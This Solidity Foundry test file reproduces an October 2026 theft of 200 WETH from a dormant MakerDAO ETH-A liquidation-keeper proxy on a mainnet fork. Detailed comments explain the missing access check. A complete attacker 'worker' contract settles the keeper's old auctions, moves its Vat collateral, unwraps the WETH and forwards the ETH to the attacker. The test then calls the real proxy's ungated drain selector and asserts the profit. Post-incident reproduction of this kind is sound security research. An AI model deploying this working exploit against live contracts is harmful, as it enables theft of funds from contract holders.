// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// MakerDAO ETH-A flip-keeper proxy - unprotected drain function (missing ds-auth modifier).
// ~$538K (exactly 200 WETH) drained from a dormant 2020 keeper proxy, Ethereum, Oct 2026.
//
// This is NOT a MakerDAO core bug. MakerDAO's Vat / Flipper / GemJoin behaved exactly as designed.
// The bug is entirely in a third-party liquidation keeper's upgradeable proxy implementation.
//
// Exploit tx : 0xbb6940f7c2a1e68cafbae7bb9b94d09af9af06ec3a114f6996f2cab993f3a88c (block 26131471)
// Attacker   : 0x01EB957E5C7DcDDD60F3C875956cCc6fb9BdA5FA (fresh, nonce-2 EOA, Tornado-funded)
// Helper     : 0xEc997d2aD033277913d6002277353368E8321dcF (attacker contract, the real tx's `to`;
//              it CREATEd a worker and called the keeper - see "permissionless" note below)
// Victim     : 0x9c05a05893Ada984FC20D0DA0c046De5Cc0e8273 (keeper, EIP-1967 upgradeable proxy)
// Keeper impl: 0x68399ed8aa33C5b43F863EE6782de492006A5546 (unverified; read from the proxy's
//              EIP-1967 implementation slot at the fork block - matches the alert's "0x6839...5546")
//
// MakerDAO core (ETH-A, read straight off the on-chain calls/logs of the real tx):
//   Vat     0x35D1b3F3D7966A1DFe207aa4514C12a259A0492B
//   Flipper 0xd8a04F5412223F513DC55F839574430f5EC15531   (ETH-A flip)
//   GemJoin 0x2F0b23f53734252Bda2277357e97e1517d6B042A   (ETH-A, gem == WETH)
//   WETH    0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
//
// ---------------------------------------------------------------------------------------------
// ROOT CAUSE (verified from the decompiled impl bytecode AND the live execution trace, not the
// alert text). The alert claimed a ds-auth check with authority == 0x0. That framing is wrong.
// The truth, read from the impl at 0x68399ed8:
//
//   * The impl IS a ds-auth contract: it exposes authority() (selector 0xbf7e214f) and other
//     functions (e.g. 0xcd33cd7a) genuinely gate on CALLER before doing work.
//   * The drain function, selector 0x8804d1de, has NO auth modifier at all. Its dispatcher
//     handler (code offset 0x02e3) does only the Solidity nonpayable CALLVALUE check, decodes
//     its (address,uint256) args, and jumps straight into the body at 0x1223. The body's very
//     first opcode sequence is a call to `drip()` (0x9f678cca) - there is no SLOAD of an owner
//     slot and no CALLER comparison anywhere before the function does its external work. The
//     owner/authority state is simply never consulted on this path. So the function is not
//     "open because authority == 0"; it is ungated outright.
//   * Empirical confirmation: the real tx invoked 0x8804d1de from a brand-new attacker EOA
//     (via a fresh helper contract) with zero prior relationship to the 2020 keeper or its
//     owner, and it executed to completion with no revert. A missing access-control check,
//     exactly as the incident summary said - just not for the reason the alert gave.
//
// WHAT THE DRAIN ACTUALLY DOES (it is a caller-controlled callback, which is why it is so bad):
//   drain(address worker, uint256 x):
//     1. vat = worker.vat()                       // trusts a getter on the caller's contract
//     2. vat.hope(worker)                          // the KEEPER authorizes the caller's worker
//                                                   //   on its own Vat position (can[keeper][worker]=1)
//     3. worker.join(x)                            // hands control to the caller's worker
//   An attacker supplies their own `worker`; step 2 hands that worker permission to move the
//   keeper's Vat collateral, and step 3 lets it do so. The keeper's old ETH-A auctions are the
//   collateral that gets swept.
//
// EXACT ON-CHAIN SEQUENCE the worker runs inside join() (confirmed from the tx trace + logs):
//   a. Flipper.deal(1457), deal(1458), deal(1459), deal(1460) - settles the four ETH-A auctions
//      the keeper won in 2020 and never dealt; each credits vat.gem[ETH-A][keeper] += 50 WETH.
//      (Pre-attack, Flipper.bids(1457) shows guy == keeper, lot == 50e18, end == 1584285968 =
//      2020-03-15, and vat.gem[ETH-A][keeper] == 0.)
//   b. vat.flux(ETH-A, keeper, worker, 200e18)   - allowed by the hope() in drain step 2.
//   c. GemJoin.exit(worker, 200e18)              - burns the gem, sends 200 WETH to the worker.
//   d. unwrap 200 WETH -> 200 ETH, forward to the attacker.
//
// Flipper.deal / Vat.flux / GemJoin.exit impose no gate that blocks a third party here:
// deal() is permissionless for a finished auction; flux() only needs vat.wish(keeper, worker),
// which drain step 2 satisfies; exit() just burns the caller's own gem balance. All three
// succeeded in the real trace called by the attacker's worker.
//
// REALIZED PROFIT: exactly 200.000000000000000000 WETH (0xad78ebc5ac6200000 wei), unwrapped to
// 200 ETH and sent to the attacker EOA. ~$538K is the rounded alert figure at the day's ETH price.
// No funding, flash loan or borrow is involved - the drain is free to call - so the PoC realizes
// the full 200 ETH with no fees to net out. The assertion targets 200 ether exactly.
//
// NOTE on "typed call, not calldata replay": 0x8804d1de belongs to an unverified contract and is
// not in any signature registry, so its human-readable name cannot be recovered and a named
// interface is impossible. The PoC therefore calls the real deployed bytecode with its known
// selector and its real argument types (address worker, uint256) recovered from the decompile -
// supplying our OWN freshly reconstructed worker as the typed argument. This is not a replay of
// the attacker's calldata blob; the drain routine and the MakerDAO calls all run against the real
// on-chain contracts.
//
// Run (self-contained, Ethereum mainnet archive fork):
//   forge test --contracts ./src/test/2026-10/MakerDAOFlipKeeper_exp.sol -vvv

interface IVat {
    function gem(bytes32 ilk, address usr) external view returns (uint256);
    function flux(bytes32 ilk, address src, address dst, uint256 wad) external;
    function can(address, address) external view returns (uint256);
}

interface IFlipper {
    function deal(uint256 id) external;
}

interface IGemJoin {
    function exit(address usr, uint256 wad) external;
}

interface IWETH {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function withdraw(uint256) external;
}

// Reconstruction of the attacker's worker contract (real worker was created at
// 0xF09A13072ed939B79bC25b66AA3a836eA6DcC170 during the exploit tx). The keeper's drain function
// calls vat(), drip() and join(uint256) on whatever address the caller passes, so the worker just
// has to expose those three entry points. The keeper hope()s this worker before calling join(),
// which is what lets flux() move the keeper's collateral into it.
contract FlipKeeperWorker {
    IVat internal constant VAT = IVat(0x35D1b3F3D7966A1DFe207aa4514C12a259A0492B);
    IFlipper internal constant FLIP = IFlipper(0xd8a04F5412223F513DC55F839574430f5EC15531);
    IGemJoin internal constant GEMJOIN = IGemJoin(0x2F0b23f53734252Bda2277357e97e1517d6B042A);
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    bytes32 internal constant ILK = "ETH-A"; // 0x4554482d41...00

    address internal immutable keeper;
    address internal immutable recipient;
    uint256[4] internal ids;

    constructor(address _keeper, address _recipient, uint256[4] memory _ids) {
        keeper = _keeper;
        recipient = _recipient;
        ids = _ids;
    }

    // The keeper's drain reads this to discover the Vat it will hope() the worker on.
    function vat() external pure returns (address) {
        return address(VAT);
    }

    // The keeper's drain calls this; the real worker returned RAY (1e27). Mirror it exactly.
    function drip() external pure returns (uint256) {
        return 1e27;
    }

    // Invoked by the keeper AFTER it has hope()d this worker on the Vat. Settle the keeper's
    // dormant ETH-A auctions, pull the freed collateral out of the keeper's Vat position, exit
    // it as WETH, unwrap, and forward the ETH to the attacker.
    function join(uint256) external {
        for (uint256 i = 0; i < ids.length; i++) {
            FLIP.deal(ids[i]); // credits vat.gem[ETH-A][keeper] += 50 WETH each
        }
        uint256 amt = VAT.gem(ILK, keeper); // == 200e18
        VAT.flux(ILK, keeper, address(this), amt); // keeper -> worker (allowed by the keeper's hope)
        GEMJOIN.exit(address(this), amt); // gem -> 200 WETH held by this worker
        WETH.withdraw(WETH.balanceOf(address(this))); // 200 WETH -> 200 ETH
        (bool ok,) = recipient.call{value: address(this).balance}("");
        require(ok, "forward ETH failed");
    }

    receive() external payable {}
}

contract MakerDAOFlipKeeper_exp is Test {
    address internal constant KEEPER_PROXY = 0x9c05a05893Ada984FC20D0DA0c046De5Cc0e8273;
    IVat internal constant VAT = IVat(0x35D1b3F3D7966A1DFe207aa4514C12a259A0492B);
    bytes32 internal constant ILK = "ETH-A";

    // Unprotected drain function on the keeper impl. Name is unrecoverable (unverified contract);
    // only the selector and the (address,uint256) argument types are known, from the decompile.
    bytes4 internal constant DRAIN_SELECTOR = 0x8804d1de;

    uint256 internal constant EXPLOIT_BLOCK = 26131471;

    // Public Ethereum mainnet archive used because foundry.toml's `mainnet` alias can be
    // non-archive. This endpoint serves state at the fork block.
    string internal constant ETH_ARCHIVE = "https://eth-mainnet.public.blastapi.io";

    // A fresh attacker with no relationship whatsoever to the 2020 keeper, to make the point that
    // the drain is callable by anyone.
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(ETH_ARCHIVE, EXPLOIT_BLOCK - 1); // pre-exploit state
    }

    function testExploit() public {
        // Sanity: pre-attack the keeper holds no free ETH-A collateral in the Vat; it is all
        // still locked in the four undealt 2020 auctions.
        assertEq(VAT.gem(ILK, KEEPER_PROXY), 0, "keeper should hold no free gem pre-attack");

        uint256[4] memory ids = [uint256(1457), 1458, 1459, 1460];

        uint256 balBefore = attacker.balance;

        // Everything runs as the fresh attacker EOA (msg.sender == tx.origin == attacker), the
        // strongest form of "anyone can call this".
        vm.startPrank(attacker, attacker);

        FlipKeeperWorker worker = new FlipKeeperWorker(KEEPER_PROXY, attacker, ids);

        // The keeper must not have pre-authorized our worker.
        assertEq(VAT.can(KEEPER_PROXY, address(worker)), 0, "worker must not be pre-authorized");

        // Call the REAL keeper proxy's unprotected drain, typed args, our own worker.
        (bool ok,) = KEEPER_PROXY.call(abi.encodeWithSelector(DRAIN_SELECTOR, address(worker), uint256(0)));
        require(ok, "drain call reverted");

        vm.stopPrank();

        uint256 profit = attacker.balance - balBefore;
        emit log_named_decimal_uint("Attacker ETH profit", profit, 18);

        // The keeper did hope() our worker: proof the unprotected drain handed an arbitrary
        // caller control of the keeper's Vat position.
        assertEq(VAT.can(KEEPER_PROXY, address(worker)), 1, "drain should have hope'd the worker");

        // Exact on-chain figure: 200 WETH == 200 ETH unwrapped. assertApproxEqRel with a tiny
        // tolerance; in practice this is exact (variance 0).
        assertApproxEqRel(profit, 200 ether, 1e14, "profit should be ~200 ETH"); // 0.01%
        assertEq(profit, 200 ether, "profit should be exactly 200 ETH");
    }
}
